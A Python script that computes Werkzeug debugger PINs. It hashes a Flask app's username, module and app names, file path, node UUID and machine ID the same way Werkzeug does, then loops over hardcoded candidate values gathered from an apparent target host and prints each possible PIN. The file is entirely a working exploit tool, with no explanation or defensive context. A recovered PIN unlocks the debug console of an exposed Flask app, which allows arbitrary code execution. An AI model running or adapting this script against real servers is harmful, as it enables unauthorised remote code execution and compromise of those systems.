import hashlib
import itertools
from itertools import chain

def crack(username, modname, appname, flaskapp_path, node_uuid, machine_id):
    public_bits = [
        username,
        modname,
        appname,
        flaskapp_path 
    ]
    private_bits = [
        node_uuid,
        machine_id 
    ]

    h = hashlib.sha1() 
    for bit in chain(public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'pinsalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv 


if __name__ == '__main__':

    usernames = ['runner']
    modnames = ['flask.app', 'werkzeug.debug']
    appnames = ['wsgi_app', 'DebuggedApplication', 'Flask']
    flaskpaths = ['/app/venv/lib/python3.10/site-packages/flask/app.py']
    nodeuuids = ['345052378370']
    machineids = ['ed5b159560f54721827644bc9b220d00.service']
    values = (usernames, modnames, appnames, flaskpaths, nodeuuids, machineids) 
    # Generate all possible combinations of values
    combinations = itertools.product(*values)
    # Iterate over the combinations and call the crack() function for each one
    for combo in combinations:
        print(combo)
        print(crack(*combo))
